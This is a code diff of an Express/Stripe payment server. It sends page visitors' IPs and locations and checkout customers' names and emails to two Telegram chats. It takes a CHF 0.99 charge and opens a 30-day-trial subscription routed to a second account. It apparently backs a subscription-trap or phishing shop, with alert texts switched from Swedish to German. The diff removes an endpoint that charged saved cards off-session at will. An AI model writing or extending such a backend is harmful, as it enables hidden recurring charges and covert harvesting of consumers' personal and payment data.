@@ -39,18 +39,34 @@ function saveCustomer(entry) {
 
 async function sendTelegram(message) {
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    console.log('[Telegram] Sending message...');
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    const payload1 = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-    });
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      body: JSON.stringify(payload1)
+    }).catch(err => console.error('[Telegram] Error:', err));
+    
+    const payload2 = {
+      chat_id: TELEGRAM_CHAT_ID_2,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message, parse_mode: 'HTML' })
-    });
+      body: JSON.stringify(payload2)
+    }).catch(err => console.error('[Telegram] Error:', err));
   } catch (err) {
-    console.log('Telegram error:', err.message);
+    console.error('[Telegram] Error:', err);
   }
 }
 
@@ -61,21 +77,23 @@ app.use(bodyParser.json());
 
 // ─── Routes ───────────────────────────────────────────────────────────────────
 
-app.post('/page-visit', async (req, res) => {
+app.post('/page-visit', (req, res) => {
   const { visitorId, ip, country, city } = req.body;
-  await sendTelegram(
-    `👁 <b>Ny sidbesökare!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `🌍 Land: ${country || 'Okänt'}\n` +
-    `🏙 Stad: ${city || 'Okänt'}\n` +
-    `🔌 IP: ${ip || 'Okänt'}\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
-  );
+  console.log('[API] /page-visit:', { visitorId, ip, country, city });
   res.json({ ok: true });
+  
+  sendTelegram(
+    `👁 <b>Neuer Seitenbesucher!</b>\n\n` +
+    `🆔 Besucher ID: <code>${visitorId}</code>\n` +
+    `🌍 Land: ${country || 'Unbekannt'}\n` +
+    `🏙 Stadt: ${city || 'Unbekannt'}\n` +
+    `🔌 IP: ${ip || 'Unbekannt'}\n` +
+    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+  );
 });
 
 app.post('/create-setup-intent', async (req, res) => {
-  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
+  let { email, fname, lname, visitorId } = req.body;
   email = email.trim().replace(/\.$/, '');
 
   try {
@@ -86,7 +104,6 @@ app.post('/create-setup-intent', async (req, res) => {
     } else {
       customer = await stripe.customers.create({
         email,
-        address: { country: 'CH' },
       });
     }
 
@@ -96,20 +113,28 @@ app.post('/create-setup-intent', async (req, res) => {
       metadata: { customer_id: customer.id },
     });
 
+    console.log('SetupIntent created:', setupIntent.id, 'for customer:', customer.id);
+
     await sendTelegram(
-      `🛒 <b>Kassauppgifter!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `📧 E-post: ${email}\n` +
-      `👤 Namn: ${fname} ${lname}\n` +
-      `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
-      `📞 Telefon: ${phone || 'N/A'}\n` +
-      `💰 Belopp: 10.90 CHF\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `🛒 <b>Checkout Informationen!</b>\n\n` +
+      `🆔 Besucher ID: <code>${visitorId}</code>\n` +
+      `📧 Email: ${email}\n` +
+      `👤 Name: ${fname} ${lname}\n` +
+      `💰 Betrag: CHF 0,99\n` +
+      `📦 Produkt: LKomplett-Paket\n` +
+      `⬇️ Lieferung: Sofortiger digitaler Download per E-Mail\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
   } catch (error) {
-    console.error('Error:', error);
+    console.error('SetupIntent Error:', error.message);
+    await sendTelegram(
+      `❌ <b>SetupIntent Fehler!</b>\n\n` +
+      `📧 Email: ${email}\n` +
+      `⚠️ Fehler: ${error.message}\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
     res.status(400).json({ error: error.message });
   }
 });
@@ -117,11 +142,11 @@ app.post('/create-setup-intent', async (req, res) => {
 app.post('/payment-initiated', async (req, res) => {
   const { visitorId, email } = req.body;
   await sendTelegram(
-    `💳 <b>Betalningsförsök startat!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `📧 E-post: ${email}\n` +
-    `⏳ Kunden har klickat på "Betala med TWINT"\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    `💳 <b>Zahlungsversuch gestartet!</b>\n\n` +
+    `🆔 Besucher ID: <code>${visitorId}</code>\n` +
+    `📧 Email: ${email}\n` +
+    `⏳ Kunde hat auf "Mit TWINT bezahlen" geklickt\n` +
+    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
   );
   res.json({ ok: true });
 });
@@ -137,6 +162,8 @@ app.post('/create-subscription', async (req, res) => {
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
 
+    console.log('Payment method type:', pmType);
+
     // Save customer to persistent storage
     saveCustomer({
       customerId,
@@ -146,10 +173,10 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 10,90 CHF
+    // Charge 1 — 0.99 CHF
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 1090,
+        amount: 99,
         currency: 'chf',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -168,7 +195,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1U9rRo2OFfoPgznT82guOr6a' }],
+      items: [{ price: 'price_1UAKj22OFfoPgznTisgz2k36' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -176,17 +203,25 @@ app.post('/create-subscription', async (req, res) => {
     console.log('Subscription created:', subscription.id, subscription.status);
 
     await sendTelegram(
-      `✅ <b>Betalning lyckades!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 10.90 CHF\n` +
-      `🆔 Prenumeration: ${subscription.id}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
+      `🆔 Besucher ID: <code>${visitorId}</code>\n` +
+      `💳 Zahlungsmethode: ${pmType}\n` +
+      `💳 Zahlungsbetrag: CHF 0,99\n` +
+      `🆔 Abonnement: ${subscription.id}\n` +
+      `📦 Produkt: LKomplett-Paket\n` +
+      `📧 Status: Digitaler Download per E-Mail versendet\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
   } catch (error) {
-    console.error('Error:', error.message);
+    console.error('Subscription Error:', error.message);
+    await sendTelegram(
+      `❌ <b>Zahlung Fehler!</b>\n\n` +
+      `🆔 Kunde: <code>${customerId}</code>\n` +
+      `⚠️ Fehler: ${error.message}\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
     res.status(400).json({ error: error.message });
   }
 });
@@ -195,47 +230,6 @@ app.post('/create-subscription', async (req, res) => {
 app.get('/customers', (req, res) => {
   const customers = loadCustomers();
   res.json({ total: customers.length, customers });
-});
-
-// ─── Manually charge a saved customer ────────────────────────────────────────
-// POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 1090, "currency": "chf" }
-app.post('/charge-saved', async (req, res) => {
-  const { customerId, amount, currency } = req.body;
-  const customers = loadCustomers();
-  const customer = customers.find(c => c.customerId === customerId);
-
-  if (!customer) {
-    return res.status(404).json({ error: 'Customer not found in saved list' });
-  }
-
-  try {
-    const payment = await stripe.paymentIntents.create({
-      amount: amount || 1090,
-      currency: currency || 'chf',
-      customer: customer.customerId,
-      payment_method: customer.paymentMethodId,
-      payment_method_types: [customer.pmType],
-      confirm: true,
-      off_session: true,
-      transfer_data: { destination: ACCOUNT_B },
-    });
-
-    console.log('Manual charge created:', payment.id, payment.status);
-
-    await sendTelegram(
-      `💰 <b>Manuell betalning!</b>\n\n` +
-      `🆔 Kund: <code>${customerId}</code>\n` +
-      `💳 Belopp: ${(amount || 1090) / 100} CHF\n` +
-      `📋 Status: ${payment.status}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
-    );
-
-    res.json({ success: true, paymentId: payment.id, status: payment.status });
-  } catch (error) {
-    console.error('Manual charge error:', error.message);
-    res.status(400).json({ error: error.message });
-  }
 });
 
 // ─── Health ───────────────────────────────────────────────────────────────────
@@ -251,5 +245,11 @@ app.get('/health', (req, res) => {
 // ─── Start ────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 4242;
 app.listen(PORT, () => {
-  console.log('Server running on http://localhost:' + PORT);
+  console.log(`\n✅ Server running on http://localhost:${PORT}`);
+  console.log(`📊 Stripe Account: ${ACCOUNT_B}`);
+  console.log(`💬 Telegram Chat 1: ${TELEGRAM_CHAT_ID}`);
+  console.log(`💬 Telegram Chat 2: ${TELEGRAM_CHAT_ID_2}`);
+  console.log(`\n📦 Product: LKomplett-Paket | CHF 0.99`);
+  console.log(`💳 Payment Method: TWINT`);
+  console.log(`📧 Delivery: Immediate Digital Email\n`);
 });
